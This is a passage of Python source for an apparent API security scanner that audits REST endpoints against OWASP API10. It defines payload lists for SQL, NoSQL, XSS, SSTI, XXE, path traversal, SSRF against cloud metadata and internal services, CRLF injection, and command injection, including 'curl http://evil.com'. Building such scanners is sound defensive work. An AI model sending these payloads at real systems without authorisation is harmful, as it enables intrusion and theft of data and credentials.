##################################
# APISCAN - API Security Scanner #
# Licensed under the MIT License #
# Author: Perry Mertens, 2025    #
##################################
"""
safe_consumption_audit.py - Enhanced OWASP API10:2023 
This Python module runs an automated safe consumption security audit for REST APIs. 
It iterates through endpoints from the OpenAPI spec, detects allowed HTTP methods, 
and sends curated payloads for SQL, NoSQL, XSS, SSTI, path traversal, SSRF, header injection, request smuggling, 
and other OWASP API Top Ten risks. Every response is logged, deduplicated, and classified. 
Hard 4xx codes and timeouts are downgraded to Info, while reflected or server error findings stay Medium to Critical, 
greatly reducing false positives. A retry hardened session, adjustable timeouts, and polite rate limiting keep scans stable. 
Results are exported as JSON and HTML
"""
from __future__ import annotations
import json
import sys
import ssl
import os 
import socket
import urllib3
import urllib.parse as urlparse
import re
import time
import threading
import random
import string
stop_requested = threading.Event()
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import logging 
import concurrent.futures

from collections import defaultdict
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple, Callable
from tqdm import tqdm
from functools import partial
from report_utils import ReportGenerator
from swagger_utils import get_builder

from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Configure session with retries
session = requests.Session()
retries = Retry(total=3, backoff_factor=1, status_forcelist=[500, 502, 503])
session.mount("http://", HTTPAdapter(max_retries=retries))
session.mount("https://", HTTPAdapter(max_retries=retries))


logging.getLogger("urllib3").setLevel(logging.CRITICAL)
Issue = Dict[str, Any]


SAFE_STATUSES = {400, 401, 403, 404, 405, 422}
# ---- color fallback ----
try:
    from colorama import Fore, Style
except ModuleNotFoundError:
    class _No:
        CYAN = GREEN = YELLOW = MAGENTA = RED = RESET_ALL = ""
    Fore = Style = _No()
# -----------------------------------

def listen_for_quit():
    print("Enter 'Q' to stop scanning...")
    while True:
        inp = sys.stdin.readline().strip().lower()
        if inp == 'q':
            stop_requested.set()
            print("\n[!] Stop requested - please wait for current tasks to complete.\n")
            break

listener_thread = threading.Thread(target=listen_for_quit, daemon=True)
listener_thread.start()

from collections import defaultdict   # - staat er al; niets wijzigen

# --- nieuw -----------------------------------------------------------
def _headers_to_list(headerobj):
    """
    Geef alle header-paren (ook dubbele) terug als lijst van tuples,
    ongeacht of het een dict of HTTPHeaderDict is.
    """
    if hasattr(headerobj, "getlist"):          # urllib3.HTTPHeaderDict
        out = []
        for k in headerobj:
            for v in headerobj.getlist(k):
                out.append((k, v))
        return out
    return list(headerobj.items())
# ---------------------------------------------------------------------

class SafeConsumptionAuditor:
    def __init__(
        self,
        base_url: str,
        session: Optional[requests.Session] = None,
        *,
        timeout: int = 10,
        rate_limit: float = 0.75,
        log_monitor: Optional[Callable[[dict[str, Any]], None]] = None,
    ) -> None:
        """
        Parameters
        ----------
        base_url     : Base URL of the target (https://example.com).
        session      : (Optional)pre configureerde requests.Session.
        timeout      : Per-request timeout in seconds (default: 8).
        rate_limit   : Minimum delay between requests to a single host.
        log_monitor  : Callback that receives each log entry (e.g. for live reporting or testing)
                       reporting of unit-tests). Signature:  Callable[[dict], None]
        """

        # --- basisconfig ----------------------------------------------------
        self.base_url: str = base_url.rstrip("/")
        self.session: requests.Session = session or self._create_secure_session()
        self.session.headers.update({"User-Agent": "safe_consumption/10"})
        self.timeout: int = timeout
        self.builder = get_builder()
        self.rate_limit: float = rate_limit
        self.log_monitor: Optional[
            Callable[[dict[str, Any]], None]
        ] = log_monitor  # real-time feed
        self.issues: List[Dict[str, Any]] = []
        self.issues_lock = threading.Lock()
        self.domain_ratelimits: defaultdict[str, threading.Lock] = defaultdict(
            threading.Lock
        )

        # Useful if you want to track sub-scanners/plugins
        self._plugins: list[Any] = []

        print(
            f"[INIT] Auditor ready for {self.base_url} "
            f"(timeout={self.timeout}s, rate_limit={self.rate_limit}s)"
        )

    @staticmethod
    def _safe_body(data: Any) -> str:
        """Convert body to readable text and catch binary data."""
        if data is None:
            return ""
        if isinstance(data, bytes):
            try:
                return data.decode("utf-8", "replace")
            except Exception:
                return f"<<{len(data)} bytes>>"
        return str(data)

    # -----------------------------------------------------------------
    # Thread-safe logging helper
    # -----------------------------------------------------------------
        # -----------------------------------------------------------------
    # Thread-safe logging helper
    # -----------------------------------------------------------------
    def _log(
        self,
        issue: str,
        target: str,
        severity: str,
        *,
        payload: Optional[str] = None,
        response: Optional[requests.Response] = None,
        extra: Optional[dict[str, Any]] = None,
    ) -> None:
        """Registreert --n finding in self.issues en toont console-output."""

        # ---------- 0. Noise-filter -----------------------------------
        skip_markers = ("failed to parse", "name 'parsed' is not defined")
        check_fields = [issue]
        if extra and "error" in extra:
            check_fields.append(str(extra["error"]))

        if any(k in f.lower() for k in skip_markers for f in check_fields):
            return  # overslaan - niet in rapport

        # ---------- 1. Basiselementen ---------------------------------
        entry: dict[str, Any] = {
            "issue": issue,
            "description": issue,
            "target": target,
            "severity": severity,
            "timestamp": datetime.utcnow().isoformat(timespec="seconds") + "Z",
            "method": "GET",
            "url": target,
            "endpoint": target,
            "status_code": response.status_code if response else "-",
        }

        if payload:
            entry["payload"] = payload
        if extra:
            entry.update(extra)

        # ---------- 2. Response-details -------------------------------
        if response is not None:
            req      = response.request
            full_url = req.url
            parsed   = urlparse.urlparse(full_url)

            entry.update(
                method=req.method,
                url=full_url,
                endpoint=full_url,           # niet inkorten
                path=parsed.path or "/",
                status_code=response.status_code,
                request_headers_list=_headers_to_list(req.headers),
                response_headers_list=_headers_to_list(response.raw.headers),
                request_body=self._safe_body(req.body),
                response_body=response.text,
                elapsed_ms=response.elapsed.total_seconds() * 1000,
                request_headers=dict(req.headers),
                response_headers=dict(response.headers),
                request_cookies=self.session.cookies.get_dict(),
                response_cookies=response.cookies.get_dict(),
            )

        # ---------- 3. Downgrade obvious false-positives --------------
        # Zet 4xx/405 SQL-injectie-tests naar Info; geen reflectie - Medium
        if issue.startswith("Possible SQL injection") and response:
            if response.status_code in SAFE_STATUSES:
                entry["severity"] = "Info"
            elif not self._is_payload_reflected(entry):
                entry["severity"] = "Medium"
                
             # ---------- 3b. Network-/timeout-errors zijn Info ------------
        if entry.get("status_code") == "-" or "timeout" in str(entry.get("error", "")).lower():
            entry["severity"] = "Info"
        
        # ---------- 4. Thread-safe append + callback ------------------
        with self.issues_lock:
            self.issues.append(entry)

        if self.log_monitor:
            try:
                self.log_monitor(entry)
            except Exception:
                pass  # callback mag de scanner niet laten crashen

        # ---------- 5. Console feedback -------------------------------
        if entry["severity"].lower() != "info":
            print(f"[{entry['severity']}] {issue} @ {entry['url']}")


    
    #--------------------------------------------------------------------
    @staticmethod
    def _create_secure_session() -> requests.Session:
        s = requests.Session()
        retries = Retry(total=3, backoff_factor=1,
                        status_forcelist=[500, 502, 503])
        s.mount("http://",  HTTPAdapter(max_retries=retries))
        s.mount("https://", HTTPAdapter(max_retries=retries))
        s.headers.update({"User-Agent": "safe_consumption10/10"})
        return s

    
    def _dedupe_issues(self) -> None:
        """
        Keep only one finding per unique method/path/status/severity combination
        Count how often the same issue occurred
        """
        seen: dict[tuple, dict] = {}          # key - eerste finding
        for f in self.issues:
            key = (f.get("method"),
                f.get("path"),              # pad is al zonder host
                f.get("status_code"),
                f.get("severity"))
            if key in seen:
                seen[key]["duplicates"] += 1
            else:
                f["duplicates"] = 0           # eerste keer
                seen[key] = f
        self.issues = list(seen.values())

        
    def _dump_raw_issues(self, log_dir: Path) -> Path:
        """
        Writes self.issues unfiltered to log_dir and returns the path
        """
        import json, datetime

        log_dir.mkdir(parents=True, exist_ok=True)
        ts   = datetime.datetime.utcnow().isoformat(timespec="seconds").replace(":", "-")
        path = log_dir / f"unsafe_raw_{ts}.json"

        with path.open("w", encoding="utf-8") as fh:
            json.dump(self.issues, fh, indent=2, ensure_ascii=False)

        print(f"[LOG] Volledig issue-log weggeschreven naar {path}")
        return path
    
    """ OWASP API10 with comprehensive tests and INFO-logging"""
    INJECTION_PAYLOADS = {
        'sql': [
            # Basic tautologies
            "' OR '1'='1",
            "' OR 1=1--",
            '" OR "" = ""',
            "' OR 'a'='a",
            "') OR ('x'='x",
            
            # Union-based injections
            "' UNION SELECT null--",
            "' UNION SELECT @@version, null--",
            "' UNION SELECT user(), database()--",
            "' UNION SELECT table_name, null FROM information_schema.tables--",
            "' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'--",
            
            # Error-based injections
            "' AND 1=CONVERT(int, @@version)--",
            "' OR 1=1/(SELECT 0 FROM DUAL WHERE 1=0)--",
            "' OR EXP(~(SELECT * FROM(SELECT @@version)x))--",
            "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # Time-based blind injections
            "' AND IF(1=1, SLEEP(2), 0)--",
            "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',2)--",
            "' OR (SELECT 1 FROM pg_sleep(2))--",
            "' OR 1=WAITFOR DELAY '0:0:2'--",
            
            # Boolean-based blind injections
            "' OR ASCII(SUBSTRING(@@version,1,1))>53--",
            "' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--",
            "' OR 1=(SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>8)--",
            
            # Alternative syntax
            "' /*!OR*/ 1=1--",
            "'/**/OR/**/1=1--",
            "' OR 1=1--%00",
            "' OR 1=1#",
            "' OR 1=1/*",
            
            # Database fingerprinting
            "' OR 1=1 UNION SELECT null, @@version--",
            "' OR 1=1 UNION SELECT null, sqlite_version()--",
            "' OR 1=1 UNION SELECT null, (SELECT banner FROM v$version) FROM dual--",
            
            # Environment leaks
            "' UNION SELECT null, LOAD_FILE('/etc/passwd')--",
            "' UNION SELECT null, (SELECT ENV('PATH'))--",
            "' UNION SELECT null, (SELECT current_setting('data_directory'))--",
            
            # Schema exploration
            "' UNION SELECT null, table_name FROM information_schema.tables--",
            "' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'--",
            
            # Conditional errors
            "' OR CASE WHEN 1=1 THEN 1/0 ELSE NULL END--",
            "' OR 1=1 AND 1=(SELECT 1 FROM GENERATE_SERIES(1,1000000000))--",
            
            # JSON-based injections
            '{"id":"1\' UNION SELECT @@version, null--"}',
            '{"username":"admin\' --", "password":"any"}',
            
            # WAF bypass techniques
            "' OR 1=1 -- -",
            "' OR '1'='1' --",
            "%bf%27 OR 1=1--",
            "%E3%80%82' OR 1=1--",  # Unicode full stop
            
            # Heavy queries (performance detection)
            "' OR 1=1 AND (SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000))>0--",
            
            # Second-order injections
            "admin' --",
            "admin'/*",
            
            # Null byte injections
            "%00' OR 1=1--",
            
            # API-specific patterns
            "1' OR 1=1 WITH (NOLOCK)--",
            "1' OR 1=1 LIMIT 1 OFFSET 1--",
            
            # Polyglot payloads
            "' /*!50000OR*/ 1=1 SElECT/**/1,2,3,4,5,6--'",
        ],
        'xss': [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<body onload=alert(1)>',
            '"><script>alert(document.domain)</script>',
            "'><iframe src=\"javascript:alert(1)\"></iframe>",
            '<math><mi//xlink:href="javascript:alert(1)">'
        ],
        'path': [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "/../../../../boot.ini",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "..%2f..%2f..%2fetc%2fshadow",
            "/etc/passwd%00",
            "%252e%252e/%252e%252e/%252e%252e/etc/passwd",
            "%252e%252e%252fetc%252fpasswd",
            "..%c0%af..%c0%afetc/passwd",
            "..%e0%80%afetc/passwd",
            "..%c1%9c..%c1%9cetc/passwd",
            "..%uff0e%uff0e%u2215etc%u2215passwd",
            "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\\\..\\\\etc\\\\passwd",
            "..//..//..//etc//passwd",
            "/etc/passwd%00.png",
            "..%2f..%2f%2e%2e%2fetc%2fpasswd",
            "../../etc/passwd%00.jpg",
            "../../etc/passwd..;/",
        ],    
        'nosql': [
            '{"username": {"$ne": null}, "password": {"$ne": null}}', 
            '{"$or": [{"admin": true}, {}]}',
            '{"$where": "sleep(5000)"}', 
            '{"username": {"$regex": ".*"}}', 
            '{"$and": [{"a": {"$gt": ""}}, {"b": {"$lt": ""}}]}'
        ],
        'ssti': [
            "{{7*7}}", "${{7*7}}", "<%= 7*7 %>", "{{config}}", 
            "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
        ],
        'ldap': [
            "*)(&(userPassword=*))", "(&(objectClass=*)(uid=*))", "*)%00", "*)(cn=*))(|(cn=*", "*))(|"
        ],
        'xxe': [
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
            "<!DOCTYPE data [<!ENTITY file SYSTEM 'file:///etc/hosts'>]><data>&file;</data>",
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % ext SYSTEM 'http://evil.com/ext.dtd'> %ext;]>"
        ],
        'cmdi': [
            ";whoami", "|id", "&nslookup test", "`id`", "$(id)", "|| ping -c 1 evil.com", "&& curl http://evil.com"
        ],
        'jsonp': [
            "callback=alert", "callback=console.log", "jsonp=alert", "cb=alert", "callbackName=alert"
        ]
    }    
    CRLF_PAYLOADS = [
        '%0d%0aX-Evil: injected',          '%0a%0dSet-Cookie: pwned=true',
        '\r\nX-Injected-Header: crlf',     '\r\nSet-Cookie: session=abc123',
        '%0d%0aLocation: https://evil.com', '%0d%0aContent-Length: 0',
        '%0d%0aContent-Type: text/html',   '%0d%0aRefresh: 0; url=https://evil.com',
        '%0d%0aLink: </malicious>; rel=preload', '%0d%0aX-Frame-Options: DENY',
        '%0d%0aX-XSS-Protection: 0',       '%0d%0aAccess-Control-Allow-Origin: *',
        '%0d%0aVary: Origin',              '%0d%0aSet-Cookie: __Host-pwned=1; Path=/; Secure; HttpOnly',
        '%0d%0aConnection: close',
    ]
    HPP_PARAMS = [
        'id', 'q', 'search', 'filter', 'sort', 'order', 'page', 'offset', 'limit',
        'username', 'user', 'email', 'token', 'session', 'auth', 'access', 'role',
        'callback', 'lang', 'debug', 'redirect', 'ref', 'category', 'tag', 'type',
        'status', 'id[]', 'name', 'fields', 'expand', 'include', 'exclude'
    ]

    SSRF_PAYLOADS = [
        #aws
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/metadata/instance",
        "http://169.254.169.254/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/",
        #local files
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "file:///proc/self/environ",
        "file:///sys/class/net/eth0/address",
         #gopher     
        "gopher://127.0.0.1:6379/_PING",
        "gopher://127.0.0.1:11211/",
        "gopher://127.0.0.1:80/_GET / HTTP/1.0",
        #loopback        
        "http://localhost",
        "http://127.0.0.1",
        "http://[::1]",
        "http://0.0.0.0",
        "http://2130706433",
        #domain tricks
        "http://example.com@127.0.0.1", "http://127.0.0.1.nip.io",
        "http://127.0.0.1.xip.io",
        #out-of band dtection
        "http://attacker.com/ssrf/test",
        "http://burpcollaborator.net", "http://requestbin.net/r/abc123",
        #common interbal services
        "http://127.0.0.1:80", "http://localhost:8000",
        "http://localhost:2375/version", "http://localhost:10250/pods",
        "http://localhost:5984/_all_dbs",
    ]

        # -------------------  False-positive filters / error keys  -------------------
    NOSQL_ERROR_KEYWORDS = [
        "mongodb",
        "mongo",
        "bson",
        "e11000 duplicate key",
        "json parse error",
        "unrecognized pipeline stage",
        "no documents in result",
        "bsonobj size must be smaller",
        "e11000 duplicate key error",
        "mongo: no documents in result",
        "unrecognized pipeline stage",
        "cannot apply $inc to a value of non-numeric type",
        "fieldpath field names may not contain",
        "mongonetworkerror",
        "connection timed out",
        "command failed with error",
        "type mismatch: expected .+ but found",
        "invalid bson field name",
        "invalid operator",
    ]

    SQL_ERROR_KEYWORDS = [
        # SQL 
        "sql", "syntax", "query", "database", "unclosed", 
        "quotation", "statement", "expression", "operator", "clause",
        "invalid", "unterminated", "malformed", "literal", "aggregate",
        "identifier", "object", "reference", "function", "type",
        "cast", "convert", "execution", "plan", "procedure",
        "transaction", "rollback", "commit", "constraint", "violation",
        "foreign key", "primary key", "unique constraint",
        "subquery", "alias", "predicate", "operand", "clause",
        "near", "token", "lexical", "optimizer",
        "incorrect", "unexpected", "missing", "extra", "redundant",
        "ambiguous", "collation", "character set", "encoding",
        
        # Database 
        "mysql", "postgres", "oracle", "mariadb", "sqlite",
        "mssql", "db2", "sybase", "informix", "h2",
        "derby", "hsqldb", "access", "firebird", "maxdb",
        
        # error codes
        "sqlstate", "pls-", "ora-", "msg", "error code",
        "exception", "failure", "warning", "notice", "hint",
        
        # SQL-injection
        "1=1", "union select", "having 1=1", "waitfor delay",
        "select pg_sleep", "benchmark(", "sleep(", "delay",
        "shutdown", "xp_cmdshell", "exec xp_", "sp_",
        "information_schema", "pg_catalog", "sys.",
        "load_file", "outfile", "dumpfile", "into file",
        "char(@@version)", "concat(", "group_concat",
        "version_comment", "version()", "current_user",
        "database()", "user()", "schema()", "current_schema",
        "pg_try_advisory_lock", "dbms_pipe", "utl_http",
        "bfilename", "ctxsys.driload", "dbms_java",
        "dbms_sql", "execute immediate", "sp_executesql",
        "declare @", "begin declare", "end",
        
        # detection patrons
        "division by zero", "arithmetic overflow", "data truncation",
        "deadlock", "timeout", "lock wait", "row-level lock",
        "isolation level", "serializable", "snapshot",
        "cannot insert null", "not-null constraint", "check constraint",
        "default constraint", "foreign key constraint", "unique constraint",
        "duplicate entry", "duplicate key", "duplicate value",
        "conflicting key", "unique index", "primary key violation",
        "referential integrity", "child record", "parent record",
        "cascade", "restrict", "no action", "set null",
        "cyclic dependency", "recursive dependency",
        "materialized view", "view", "trigger", "index",
        "sequence", "synonym", "tablespace", "partition",
        "extent", "segment", "block", "extent", "allocation"
        
        #  Oracle indicatoren
        "ora-", "pls-", "oracle error", "oracle driver", "tns-", "oracle exception",
        "oracle.jdbc", "oci error", "sqlplus", "plsql", "oracle database",
        "ora_", "oracle server", "oracle11g", "oracle12c", "oracle19c",
        "oracle data integrator", "oracle forms", "oracle report",
        "oracle financials", "oracle e-business suite", "oracle apex",
        "oracle sql developer", "oracle net", "oracle listener",
        "ora-12154", "ora-12514", "ora-12541", "ora-01017", "ora-28000",
        "ora-00942", "ora-00904", "ora-02291", "ora-02290", "ora-00001",
        "ora-01400", "ora-01401", "ora-01407", "ora-01722", "ora-01843",
        "ora-01858", "ora-06512", "ora-06550", "ora-24344", "ora-29283",
        "ora-29532", "ora-600", "ora-7445", "ora-01555", "ora-04030",
        "ora-04031", "ora-04068", "ora-12560", "ora-27101", "ora-27102",
        "oracle xml parser", "oracle text", "oracle spatial", "oracle advanced security",
        "oracle wallet", "oracle label security", "oracle audit vault",
        "oracle data guard", "oracle rman", "oracle asm", "oracle rac",
        "oracle dblink", "oracle materialized view", "oracle sequence",
        "oracle synonym", "oracle package", "oracle trigger", "oracle index",
        "oracle partition", "oracle tablespace", "oracle segment",
        "oracle extent", "oracle block", "oracle lob", "oracle rowid",
        "oracle rownum", "oracle flashback", "oracle recycle bin",
        "oracle vpd", "oracle fga", "oracle audit", "oracle fine-grained auditing",
        "oracle virtual private database", "oracle context", "oracle job",
        "oracle scheduler", "oracle profile", "oracle role", "oracle privilege",
        "oracle grant", "oracle revoke", "oracle system privilege",
        "oracle object privilege", "oracle sysdba", "oracle sysoper",
        "oracle dba", "oracle sql loader", "oracle external table",
        "oracle utl_file", "oracle utl_http", "oracle utl_smtp", "oracle utl_tcp",
        "oracle dbms_output", "oracle dbms_sql", "oracle dbms_job",
        "oracle dbms_scheduler", "oracle dbms_lock", "oracle dbms_crypto",
        "oracle dbms_random", "oracle dbms_lob", "oracle dbms_metadata",
        "oracle dbms_stats", "oracle dbms_xplan", "oracle dbms_profiler",
        "oracle dbms_trace", "oracle dbms_alert", "oracle dbms_pipe",
        "oracle dbms_aq", "oracle dbms_mview", "oracle dbms_redefinition",
        "oracle dbms_flashback", "oracle dbms_utility", "oracle dbms_session",
        "oracle dbms_application_info", "oracle dbms_result_cache",
        "oracle dbms_shared_pool", "oracle dbms_rowid", "oracle dbms_obfuscation_toolkit",
    ]

    SQL_ERROR_REGEX = [
        # Colom erros
        r"column [\"\']?.+?[\"\']? does not exist",
        r"invalid column name [\"\']?.+?[\"\']?",
        r"unknown column [\"\']?.+?[\"\']? in [\"\']?field list[\"\']?",
        r"column [\"\']?.+?[\"\']? (?:is|must be) of type .+? but expression is of type",
        
        # Tabel erros
        r"relation [\"\']?.+?[\"\']? does not exist",
        r"invalid (?:object|table) name [\"\']?.+?[\"\']?",
        r"table [\"\']?.+?[\"\']? doesn't exist",
        r"no such table: [\"\']?.+?[\"\']?",
        r"table [\"\']?.+?[\"\']? has no column named [\"\']?.+?[\"\']?",
        
        # Syntaxis-erros
        r"unterminated quoted string",
        r"incorrect syntax near [\"\']?.+?[\"\']?",
        r"unexpected token: .+? at position \d+",
        r"expecting (.+?), found (.+?)",
        r"missing (.+?) at (.+?)",
        r"extraneous input [\"\']?.+?[\"\']? expecting",
        r"token recognition error at: [\"\']?.+?[\"\']?",
        r"syntax error at or near [\"\']?.+?[\"\']?",
        r"unexpected end of SQL command",
        
        # Type-conversion errors
        r"invalid input syntax for type .+?: [\"\']?.+?[\"\']?",
        r"could not convert .+? to .+?",
        r"conversion failed when converting .+? to data type .+?",
        r"invalid number",
        r"numeric value out of range",
        
        # Operator erros
        r"operator does not exist: .+? = .+?",
        r"operator is not unique: .+? = .+?",
        r"no operator matches the given name and argument type",
        
        # Privilege-erros
        r"permission denied for (?:relation|table|sequence|function) [\"\']?.+?[\"\']?",
        r"insufficient privilege(s?)",
        r"access denied for user",
        r"user [\"\']?.+?[\"\']? does not have (?:select|insert|update|delete) privilege",
        
        # Constraint-erros
        r"violates (?:unique|primary key|foreign key|check) constraint [\"\']?.+?[\"\']?",
        r"duplicate key value violates unique constraint",
        r"insert or update on table [\"\']?.+?[\"\']? violates foreign key constraint",
        
        #  patronen
        r"subquery (?:returns|evaluates to) more than one row",
        r"window function calls cannot be nested",
        r"recursive common table expression [\"\']?.+?[\"\']? does not have the form non-recursive term",
        r"cannot drop [\"\']?.+?[\"\']? because other objects depend on it",
        r"could not serialize access due to concurrent update",
        
        # Oracle  regex patronen
        r"ora-\d+: .+",
        r"pls-\d+: .+",
        r"tns-\d+: .+",
        r"ora-(\d{5}): .+",  # Vijfcijferige Oracle-foutcodes
        r"ora-(\d{5}): .+",  # Vijfcijferige Oracle-foutcodes
        r"PLS-(\d{4,5}): .+",  # PL/SQL-foutcodes
        r"TNS-(\d{5}): .+",  # Netwerkfoutcodes
        r"LPX-(\d{5}): .+",  # XML-foutcodes
        r"error (?:at|in) line \d+",  # PL/SQL regelnummers
        r"table or view does not exist",
        r"snapshot too old",
        r"unique constraint \(\S+\) violated",
        r"integrity constraint \(\S+\) violated",
        r"missing expression",
        r"invalid identifier",
        r"invalid relational operator",
        r"invalid number",
        r"value too large for column",
        r"insufficient privileges",
        r"name is already used by an existing object",
        r"object no longer exists",
        r"buffer too small for CLOB to CHAR or BLOB to RAW conversion",
        r"maximum number of expressions in a list is \d+",
        r"exact fetch returns more than requested number of rows",
        r"fetch out of sequence",
        r"user lacks privilege or object not found",
        r"cannot drop \S+ because other objects depend on it",
        r"quota exceeded for tablespace \S+",
        r"deadlock detected while waiting for resource",
        r"resource busy and acquire with NOWAIT specified or timeout expired",
        r"package \S+ does not exist",
        r"procedure \S+ does not exist",
        r"function \S+ does not exist",
        r"sequence \S+ does not exist",
        r"synonym \S+ does not exist",
        r"index \S+ does not exist",
        r"trigger \S+ does not exist",
        r"view \S+ does not exist",
        r"materialized view \S+ does not exist",
        r"type \S+ does not exist",
        r"directory \S+ does not exist",
        r"library \S+ does not exist",
        r"invalid character",
        r"invalid username/password",
        r"invalid option",
        r"invalid argument",
        r"invalid operation",
        r"invalid path",
        r"invalid host",
        r"invalid port",
        r"invalid service",
        r"invalid connection string",
        r"invalid connect descriptor",
        r"invalid net service name",
        r"invalid net service",
        r"invalid net address",
        r"invalid protocol",
        r"invalid session",
        r"invalid cursor",
        r"invalid column name",
        r"invalid column type",
        r"invalid column index",
        r"invalid rowid",
        r"invalid lob locator",
        r"invalid file operation",
        r"invalid directory object",
        r"invalid file name",
        r"invalid file format",
        r"invalid package state",
        r"invalid cursor operation",
        r"invalid function called",
        r"invalid package",
        r"invalid operation on null",
        r"invalid datatype",
        r"invalid number format",
        r"invalid date format",
        r"invalid time zone",
        r"invalid timestamp",
        r"invalid interval",
        r"invalid hex number",
        r"invalid binary number",
        r"invalid octal number",
        r"invalid row number",
        r"invalid row count",
        r"invalid array size",
        r"invalid buffer length",
        r"invalid position",
        r"invalid offset",
        r"invalid length",
        r"invalid subscript",
        r"invalid attribute",
        r"invalid object",
        r"invalid reference",
        r"invalid identifier",
        r"invalid relational operator",
        r"invalid comparison",
        r"invalid escape character",
        r"invalid escape sequence",
        r"invalid regular expression",
        r"invalid lob parameter",
        r"invalid lob offset",
        r"invalid lob amount",
        r"invalid lob operation",
        r"invalid nls parameter",
        r"invalid nls string",
        r"invalid client character set",
        r"invalid national character set",
        r"invalid character set name",
        r"invalid character set conversion",
        r"invalid multibyte character",
        r"invalid byte sequence",
        r"invalid encoding",
        r"invalid xml document",
        r"invalid xml content",
        r"invalid xml structure",
        r"invalid xml tag",
        r"invalid xml attribute",
        r"invalid xml namespace",
        r"invalid xml prefix",
        r"invalid xml name",
        r"invalid xml value",
        r"invalid xml query",
        r"invalid xml path",
        r"invalid xml transform",
        r"invalid xml schema",
        r"invalid xml context",
        r"invalid xml fragment",
        r"invalid xml data",
        r"invalid xml index",
    ]

    GRAPHQL_INTROSPECTION_QUERY = """
    query IntrospectionQuery {
    __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
        ...FullType
        }
        directives {
        name
        description
        locations
        args {
            ...InputValue
        }
        }
    }
    }

    fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
        ...InputValue
        }
        type {
        ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
    }

    fragment InputValue on __InputValue {
    name
    description
    type { ...TypeRef }
    defaultValue
    }

    fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
                }
            }
            }
        }
        }
    }
    }
    """
        
        

    @staticmethod
    def third_party_hosts_from_swagger(swagger_path: str) -> List[str]:
        spec = json.loads(Path(swagger_path).read_text(encoding='utf-8'))
        hosts: Set[str] = set()
        for srv in spec.get('servers', []):
            url = srv.get('url')
            if url:
                parsed = urlparse.urlparse(url)
                if parsed.netloc:
                    hosts.add(parsed.netloc.split(':')[0])
        def walk(node: Any):
            if isinstance(node, dict):
                for k, v in node.items():
                    if k == '$ref' and isinstance(v, str) and v.startswith('http'):
                        hosts.add(urlparse.urlparse(v).netloc.split(':')[0])
                    walk(v)
            elif isinstance(node, list):
                for item in node:
                    walk(item)
        walk(spec)
        return sorted(hosts)

    @staticmethod
    def endpoints_from_swagger(swagger_path: str) -> List[str]:
        spec = json.loads(Path(swagger_path).read_text(encoding='utf-8'))
        servers = [srv.get('url').rstrip('/') for srv in spec.get('servers', []) if srv.get('url')]
        paths = spec.get('paths', {})
        endpoints: List[str] = []
        for server in servers:
            for path in paths:
                endpoints.append(server + path)
        return endpoints
    
    def _is_payload_reflected(self, finding: dict) -> bool:
        """Check if the payload is clearly reflected in the response"""
        payload = finding.get("payload") or ""
        body    = (finding.get("response_body") or "").lower()
        return payload.lower() in body
    


# ---------------------------------------------------------------------
# 1.  INJECTION TEST
# ---------------------------------------------------------------------
    def _test_injection(
        self,
        test_url: str,
        attack_type: str,
        *,
        method: str = "auto",
        payload: str | None = None,
    ) -> None:
        """
        Performs one injection test against the given URL
        - Supports SQL, NoSQL, XSS, SSTI, SSRF, LDAP, XXE (via attack_type)
        - Injects into both query string and path parameter
        - Choose HTTP method automatically or force via `method=`

        Logs a critical finding if the injection appears successful
        """
        # -------- early exit ------------------------------------------------
        if stop_requested.is_set():
            return

        # -------- standaard payloads ----------------------------------------
        default_payloads = {
            "sql": "' OR 1=1; --",  # Verbeterde SQLi payload
            "nosql": '{"$ne": "invalid"}',  # Meer realistische NoSQL payload
            "xss": "<svg/onload=alert(1)>",  # Compacte XSS payload
            "ssti": "${7*7}",  # Alternatieve SSTI syntax
            "ssrf": "http://169.254.169.254/latest/meta-data/",  # Meer specifieke SSRF
            "ldap": "*))(&(objectClass=*",  # Verbeterde LDAP payload
            "xxe": "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><test>&xxe;</test>",
            "cmdi": "; id;",  # simple command injection
            "jsonp": "callback=alert(1)",  # JSONP callback
            "path": "../../../../etc/passwd%00",  # Path traversal met null-byte
            "crlf": "%0d%0aX-Injected: header",  # CRLF injection
            "hpp": "id=1&id=2",  # HTTP Parameter Pollution
            "graphql": "__schema"  # GraphQL introspection
        }
        payload = payload or default_payloads.get(attack_type, "1")

        parsed = urlparse.urlparse(test_url)
        domain = parsed.netloc

        try:
            # ---------- rate-limit guard ------------------------------------
